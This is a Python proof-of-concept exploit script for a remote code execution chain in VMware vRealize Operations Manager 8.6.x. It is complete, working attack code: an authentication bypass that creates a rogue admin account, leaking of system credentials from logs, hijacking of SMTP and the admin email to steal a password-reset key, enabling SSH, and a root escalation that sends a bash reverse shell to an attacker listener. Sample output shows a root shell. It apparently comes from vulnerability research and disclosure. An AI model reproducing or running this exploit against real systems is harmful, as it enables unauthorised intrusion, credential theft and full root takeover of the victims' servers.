#!/usr/bin/env python3
"""
# VMware vRealize Operations Manager Remote Code Execution Exploit

## Found by

Steven Seeley of Qihoo 360 Vulnerability Research Institute

## Tested versions

1.

8.6.3.19682901 (latest at the time)
File: vRealize-Operations-Manager-Appliance-8.6.3.19682901_OVF10.ova
SHA1: 4637b6385db4fbee6b1150605087197f8d03ba00

2.

8.6.2.19081814
File: vRealize-Operations-Manager-Appliance-8.6.2.19081814_OVF10.ova
SHA1: 0363f4304e4661dde0607a3d22b4fb149d8a10a4

## Notes

- This exploit will require the attacker to supply:

  1. A valid dashboardlink token that will be used to bypass authentication.
  2. Their own SMTP server settings, this is to ensure that exploitation works.
  3. A valid Pak file that is signed by VMWare such as `APUAT-8.5.0.18176777.pak`.

- There is alot of moving parts to this exploit, hopefully I engineered it right so it works on the first shot.
- The exploit takes on average ~1m34.142s to complete (tested 5 times), I tried to engineer this to be faster, but it's within an allocated time for a competition ;->

## Example

```
researcher@mars:~$ ./poc.py 
(+) usage: ./poc.py <target> <connectback> <dashboardlink_token>
(+) eg: ./poc.py 192.168.2.196 192.168.2.234 uuncuybis9

researcher@mars:~$ ./poc.py 192.168.2.196 192.168.2.234 uuncuybis9
(+) detected version: 8.6.3.19682901
(+) bypassing authentication with the dashboardlink...
(+) created an admin account: hacker:P@ssw0rd#
(+) logged in to /ui/ using 6E931F2DFFCF66CDB9F22072F305197A
(+) obtained csrf token d75a61ff-6c0c-4534-b1f8-a0b7abf57bb5
(+) uploaded the pak file APUAT-85018176777
(+) triggered the update
(+) obtained instance_id: db83c9ea-ec75-4819-80ff-d8f11e923785
(+) obtained ldu_id: test 
(+) leaked system account: bWFpbnRlbmFuY2VBZG1pbjpSQUNORitDUnM4blg4amRqUlFTRDFGcEM=
(+) set the smtp settings to ensure email works
(+) enabled ssh access
(+) set admin email to steven@srcincite.io
(+) requested admin password reset...
(+) got reset key QXCGeSLuVOsNYcpKGgvCauznA47aLj3T
(+) reset system user to admin:YHzFHDWeDd#1337
(+) starting handler on port 1337
(+) connection from 192.168.2.196
(+) pop thy shell!
bash: cannot set terminal process group (30290): Inappropriate ioctl for device
bash: no job control in this shell
root@photon-machine [ ~ ]# id
id
uid=0(root) gid=0(root) groups=0(root),28(wheel),1000(vami)
root@photon-machine [ ~ ]# uname -a
uname -a
Linux photon-machine 4.19.232-4.ph3 #1-photon SMP Wed Apr 6 02:20:55 UTC 2022 x86_64 GNU/Linux
root@photon-machine [ ~ ]#
```
"""
import io
import re
import sys
import json
import time
import socket
import random
import string
import urllib3
import imaplib
import paramiko
import requests
from base64 import b64encode
from telnetlib import Telnet
from threading import Thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# update these for yourself
SMTP_USR = "steven@srcincite.io"
SMTP_PWD = "XXXXXXXXXXXXXXXXXXX"
SMTP_SVR = "mail.YYYYYYYYYY.net"
SMTP_PRT = 587
SMTP_TLS = True
SMTP_SSL = False

def grab_token(target, creds, h):
    uri = f"https://{target}/suite-api/api/auth/token/acquire"
    r = requests.post(uri, json = {
        "username": creds.split(":")[0],
        "password": creds.split(":")[1]
    }, verify=False, headers=h)
    assert r.status_code == 200 and r.headers['content-type'] == "application/json;charset=UTF-8", "(-) unexpected response from acquiring token"
    return r.json()["token"]

def leak_ids(target, cookie, csrf):
    uri = f"https://{target}/ui/supportLogs.action"
    d = {
        "mainAction" : "getLogTree",
        "lduId" : "vRealizeClusterNode",
        "groupBy" : "",
        "node" : "source",
        "secureToken": csrf
    }
    r = requests.post(uri, data=d, cookies=cookie, verify=False)
    assert r.headers["Content-Type"] == "application/json;charset=UTF-8", "(-) failed to leak the instanceId!"
    if len(r.json()["children"]) > 0:
        if len(r.json()["children"][0]["children"]) > 0:
            for node in r.json()["children"][0]["children"]:
                if node["logType"] == "OTHER":
                    return [node["instanceId"], node["lduId"]]
    raise ValueError("(-) failed to find the target instanceId!") 

def reset_admin_pwd(target, reset_key):
    uri = f"https://{target}/admin/newPass.action"
    pwd = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(10))
    pwd += "#1337"
    d = {
        "mainAction" : "verifyTokenPass",
        "userName" : "admin",
        "newPassword" : pwd,
        "languageCode" : "us",
        "secureToken" : reset_key
    }
    r = requests.post(uri, data=d, verify=False)
    assert r.status_code == 200, "(-) unable to reset admin password"
    return pwd

def send_reset_token(target):
    uri = f"https://{target}/admin/emailLink.action"
    d = {
        "mainAction" : "sendMail",
        "userName" : "admin",
        "userEmail" : SMTP_USR,
        "languageCode" : "us",
    }
    r = requests.post(uri, data=d, verify=False)
    assert r.status_code == 200 and r.text == "ok", "(-) unable to send admin password reset request"

def enable_ssh(target, h):
    # a borrowed tekniq from ptswarm
    uri = f"https://{target}/casa/ssh/enable"
    r = requests.post(uri, verify=False, headers=h)
    assert r.status_code == 200 and r.headers["Content-Type"] == "application/json;charset=UTF-8", "(-) unexpected response to enable ssh"
    assert r.json()["is_ssh_enabled"] == True, "(-) unable to enable ssh"

# vuln 1 - authentication bypass
def create_admin(target, tkn):
    perms = []
    usr = "hacker"
    pwd = "P@ssw0rd#"
    roles = ["Administrator", "AgentManager", "ContentAdmin", "PowerUser", "PowerUserMinusRemediation", "ReadOnly"]
    for i in range(1,5):
        roles.append(f"GeneralUser-{i}")
    for role in roles: 
        perms.append({
            "roleName": role,
            "traversalSpecs": [],
            "allowAllResources": True
        })
    p = {
        "t" : tkn,   # auth bypass
        "mainAction" : "createUser"
    }
    uri = f"https://{target}/ui/userManagement.action"
    d = {
        "username" : usr,
        "password" : pwd,
        "groupIds": "[]",
        "permissionControl": json.dumps(perms),
    }
    r = requests.post(uri, data=d, params=p, verify=False, allow_redirects=False)
    assert r.status_code == 302, "(-) authentication bypass failed, check your dashboardlink token"
    assert r.headers['location'] == "dashboardViewer.action?mainAction=dr", "(-) unexpected redirect, check your dashboardlink token"
    return [usr, pwd]

# vuln 2 - leak privileged credentials
def leak_creds(target, cookie, csrf, instance_id, ldu_id, pakid):
    uri = f"https://{target}/ui/supportLogs.action"
    d = {
        "mainAction" : "getLogFileContents",
        "instanceId" : instance_id,
        "lduId" : ldu_id,
        "logType" : "OTHER",
        "fileName" : f"pakManager/{pakid}/apply_system_update_stderr.log",
        "lineLimit": 2000,
        "linePosition" : 1, # just to be on the safe side
        "secureToken": csrf
    }
    r = requests.post(uri, data=d, cookies=cookie, verify=False)
    assert r.headers["Content-Type"] == "application/json;charset=UTF-8", "(-) failed to leak the credentials from the log!"
    if "fileContent" not in r.json():
        return None
    for line in r.json()["fileContent"]:
        m = re.search("'Authorization': 'Basic (.*)'}", line)
        if m:
            return m.group(1)
    return None

# vuln 3 - elevate privileges to root
def reverse_root_shell(rhost, rport):
    d = ''.join(random.choice(string.ascii_lowercase) for i in range(6))
    return b64encode(str.encode(f"""#!/bin/sh
mkdir -p {d}
mkdir -p vmware-vcopssuite/utilities/bin/
cat <<EOT > vmware-vcopssuite/utilities/bin/gss_troubleshooting.sh
#!/bin/sh
rm -rf {d}
rm -rf vmware-vcopssuite
bash -c "bash -i >& /dev/tcp/{rhost}/{rport} 0>&1"
EOT
chmod 755 vmware-vcopssuite/utilities/bin/gss_troubleshooting.sh
sudo VCOPS_BASE={d} /usr/lib/vmware-vcopssuite/python/bin/python /usr/lib/vmware-vcopssuite/utilities/bin/generateSupportBundle.py test > /dev/null 2>&1""")).decode()

def login(target, interface, creds):
    d = {
        "mainAction" : "login",
        "userName" : creds[0],
        "password" : creds[1],
        "authSourceType" : ""
    }
    r = requests.post(f"https://{target}/{interface}/login.action", data=d, verify=False, allow_redirects=False)
    assert "Set-Cookie" in r.headers and r.text == "ok", "(-) failed to login with the newly created account!"
    m = re.search("JSESSIONID=(.{32});", r.headers["set-cookie"])
    assert m, "(-) failed to find a match on a JSESSIONID!"
    return m.group(1)

def grab_csrf(target, interface, cookie):
    uri = f"https://{target}/{interface}/commonJS.action"
    p = {
        "mainAction":"getApplicationGlobalData"
    }
    r = requests.get(uri, params=p, cookies=cookie, verify=False)
    assert r.headers["Content-Type"] == "application/json;charset=UTF-8", "(-) unexpected content type when requesting the csrf token!"
    return r.json()["secureToken"] 

def upload_pak(target, cookie, csrf):
    uri = f"https://{target}/ui/admin/services/solution/upload"
    p = {
        "uploadId": 123,
        "secureToken" : csrf
    }
    # we need to use a valid pak file so that we can trigger the reinstall
    content = open("APUAT-8.5.0.18176777.pak", "rb").read()    
    f = {
        "solution": ('APUAT-8.5.0.18176777.pak', content, 'application/octet-stream'),
        "forceUpload": (None, True),
        "forceContent": (None, True)
    }
    r = requests.post(uri, params=p, files=f, cookies=cookie, verify=False)
    assert r.headers["Content-Type"] == "text/plain;charset=utf-8", "(-) failed to upload the pak file!"
    return r.json()["pakId"]

def trigger_update(target, cookie, csrf, pakid):
    # this triggers the writing to the log file
    uri = f"https://{target}/ui/solution.action"
    p = {
        "mainAction" : "reinstall",
        "forceContentUpdate" : True,
        "pakId" : pakid,
        "secureToken" : csrf
    }
    r = requests.get(uri, params=p, cookies=cookie, verify=False)
    assert r.headers["Content-Type"] == "application/json;charset=UTF-8", "(-) failed to trigger re-install!"

def set_admin_email(target, h):
    uri = f"https://{target}/casa/cluster/security/email"
    r = requests.put(uri, json={
        "name": "admin",
        "address" : SMTP_USR
    }, headers=h, verify=False)
    assert r.status_code == 200, "(-) failed to set the admin email address!"

def set_smtp_settings(target, h):
    uri = f"https://{target}/casa/cluster/security/smtp"
    e_type = "TLS" if SMTP_TLS else "SSL" 
    e_enabled = True if SMTP_TLS or SMTP_SSL else False
    j = {
        "host": SMTP_SVR,
        "port": SMTP_PRT,
        "encryptionEnabled": e_enabled,
        "encryptionType": e_type,
        "username": SMTP_USR,
        "password": SMTP_PWD,
        "email":{
            "name": SMTP_USR,
            "address": SMTP_USR
        },
        # I assume you hackers use password authentication on your email
        "authenticationEnabled": True,
        "passwordSpecified": True
    }
    r = requests.put(uri, json=j, headers=h, verify=False)
    assert r.status_code == 200, "(-) unable to set the smtp settings!"

def handler(lp):
    print(f"(+) starting handler on port {lp}")
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) connection from {addr[0]}")
    t.sock = conn
    print("(+) pop thy shell!")
    t.interact()

def login_email():
    imap = imaplib.IMAP4_SSL(SMTP_SVR)
    imap.login(SMTP_USR, SMTP_PWD)
    return imap

def get_key_from_email(imap):
    status, messages = imap.select("INBOX")
    latest_email_id = int(messages[0])
    result, data = imap.search(None, '(SUBJECT "vRealize Operations Admin Password Reset")' )
    ids = data[0]
    id_list = ids.split()
    if len(id_list) == 0:
        return None
    searched_id = int(id_list[-1])
    if searched_id == latest_email_id:
        result, data = imap.fetch(str(latest_email_id), "(RFC822)")
        match = re.search(b"vfpt.action#(.*)=\\r\\n(.*)\" class=3D", data[0][1])
        key = (match.group(1) + match.group(2)).decode("utf-8") 
        return key
    return None

def get_version(target):
    uri = f"https://{target}/ui/login.action"
    r = requests.get(uri, verify=False)
    m = re.search("SessionProvider.js\?version=([.\d]*)\"", r.text)
    assert m, "(-) failed to find version! Are you even targeting the right thing?"
    return m.group(1)

def main():
    if len(sys.argv) != 4:
        print(f"(+) usage: {sys.argv[0]} <target> <connectback> <dashboardlink_token>")
        print(f"(+) eg: {sys.argv[0]} 192.168.2.196 192.168.2.234 uuncuybis9")
        sys.exit(1)
    target = sys.argv[1]
    rhost = sys.argv[2]
    rport = 1337
    token = sys.argv[3]
    if ":" in sys.argv[2]:
        rhost = sys.argv[2].split(":")[0]
        assert sys.argv[2].split(":")[1].isnumeric(), "(-) port must be a valid integer"
        rport = int(sys.argv[2].split(":")[1])

    # version 8.6.3.19682901 and 8.6.2.19081814 confirmed vulnerable
    ver = get_version(target)
    print(f"(+) detected version: {ver}")

    # Stage 1 - Authentication bypass
    print("(+) bypassing authentication with the dashboardlink...")
    # 1. Create a (non system) admin user
    creds = create_admin(target, token)
    print(f"(+) created an admin account: {creds[0]}:{creds[1]}")
    # 2. Login to the system with the new account
    sid = login(target, "ui", creds)
    cookie = {"JSESSIONID" : sid}
    print(f"(+) logged in to /ui/ using {sid}")
    # 3. Obtain the csrf token for the ui interface
    csrf = grab_csrf(target, "ui", cookie)
    print(f"(+) obtained csrf token {csrf}") 

    # Stage 2 - Leak credentials for an in application eop
    # 4. Upload a valid update file
    pakid = upload_pak(target, cookie, csrf)
    print(f"(+) uploaded the pak file {pakid}")
    # 5. Trigger the installation of the update
    trigger_update(target, cookie, csrf, pakid)
    print("(+) triggered the update")
    # 6. Obtain a valid instanceId and lduId
    instance_id,  ldu_id = leak_ids(target, cookie, csrf)
    print(f"(+) obtained instance_id: {instance_id}")
    print(f"(+) obtained ldu_id: {ldu_id} ")  
    leaked_creds = None
    # 7. Leak the maintenanceAdmin account
    while leaked_creds == None:
        leaked_creds = leak_creds(target, cookie, csrf, instance_id, ldu_id, pakid)
        time.sleep(0.5)
    print(f"(+) leaked system account: {leaked_creds}")

    # Stage 3 - now we go ahead and reset the admin password and enable SSH using casa api
    h = {"authorization": f"Basic {leaked_creds}"}
    # 8. Set the targets SMTP settings so that we can be sure that outgoing emails work
    set_smtp_settings(target, h)
    print("(+) set the smtp settings to ensure email works")
    # 9. Enable ssh if we want to gain rce (I couldn't find any other bug for rce, well done!)
    enable_ssh(target, h)
    print("(+) enabled ssh access")
    # 10. Set the admin email address to the attackers email address
    set_admin_email(target, h)
    print(f"(+) set admin email to {SMTP_USR}")
    # 11. Request a password reset for the admin user which is delivered to the attackers inbox
    send_reset_token(target)
    print(f"(+) requested admin password reset...")
    # 12. Find the password reset email and extract the reset token
    reset_key = None
    imap = login_email()
    while reset_key == None:
        reset_key = get_key_from_email(imap)
        time.sleep(0.5)
    print(f"(+) got reset key {reset_key}")
    # 13. Reset the admin password
    pwd = reset_admin_pwd(target, reset_key)
    print(f"(+) reset system user to admin:{pwd}")

    # Stage 4 - Gain RCE as root
    # 14. Setup our listener
    handlerthr = Thread(target=handler, args=[rport])
    handlerthr.start()
    # 15. trigger root shell
    ssh = paramiko.SSHClient() 
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target, username="admin", password=pwd)
    ssh.exec_command(f"echo {reverse_root_shell(rhost, rport)}|base64 -d|bash")
    ssh.close()

if __name__ == "__main__":
    main()
